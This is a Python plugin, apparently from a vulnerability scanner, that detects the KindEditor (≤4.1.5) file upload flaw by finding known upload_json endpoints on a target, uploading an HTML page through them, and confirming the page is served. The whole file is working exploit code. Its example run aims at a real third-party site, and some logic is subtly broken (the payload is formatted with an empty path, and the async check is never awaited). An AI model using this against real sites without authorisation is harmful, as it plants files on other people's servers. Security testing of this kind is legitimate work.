#!/usr/bin/env python3

import re
import aiohttp
from app.lib.common import get_useragent
from app.lib.request import request

class Upload_File_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'kindeditor 文件上传漏洞',
            'description': 'kindeditor 文件上传漏洞, 影响范围为: kindeditor<=4.1.5',
            'date': '',
            'exptype': 'check',
            'type': 'File Upload'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url 
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.path = ''
        self.html_payload = '''
                        <html><head>
                        <title>Uploader</title>
                        <script src="%s/SEMCMS_PHP_3.9/Edit/kindeditor.js"></script>
                        <script>
                        KindEditor.ready(function(K) {
                        var uploadbutton = K.uploadbutton({
                        button : K('#uploadButton')[0],
                        fieldName : 'imgFile',
                        url : '%s',
                        afterUpload : function(data) {
                        if (data.error === 0) {
                        var url = K.formatUrl(data.url, 'absolute');
                        K('#url').val(url);}
                        },
                        });
                        uploadbutton.fileBox.change(function(e) {
                        uploadbutton.submit();
                        });
                        });
                        </script></head><body>
                        <div class="upload">
                        <input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
                        <input type="button" id="uploadButton" value="Upload" />
                        </div>
                        </body>
                        </html>
        ''' %(self.url, self.path)

    async def check_path(self):

        """
        检测是否存在路径

        :param:

        :return bool True or False: 是否存在路径
        """

        site_type= ['/kindeditor/asp/upload_json.asp','/kindeditor/asp.net/upload_json.ashx', '/kindeditor/jsp/upload_json.jsp', '/kindeditor/php/upload_json.php','/kindeditor/examples/uploadbutton.html']
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        for url in site_type:
            check_url = self.url + url + '?dir=file'
            check = await request.get(check_url, headers = self.headers)
            if check.status == 200:
                self.path = check_url
                return True

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            if await self.check_path():
                files = {
                    'file_type': 'imgFile',
                    'file_name': 'test.html',
                    'file_content': self.html_payload, 
                    'content_type': 'application/octet-stream'
                }
                data = aiohttp.FormData()
                data.add_field(files['file_type'], files['file_content'], filename = files['file_name'], content_type = files['content_type'])
                upload_html = await request.post(self.path, headers = self.headers, data = data)
                if upload_html.status == 200:
                    pattern = re.compile('{"error":0,"url":"(.*?)"}')
                    html = pattern.findall(await upload_html.text())[0].replace('\\', '').split('/')
                    html_path = '/' + '/'.join(html[2:])
                    check_html = await request.get(self.url + html_path, headers = self.headers)
                    if check_html.status == 200:
                        # print("存在kindeditor上传漏洞")
                        return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    UPLOAD_FILE = Upload_File_BaseVerify('http://baidu.com/')
    UPLOAD_FILE.check()


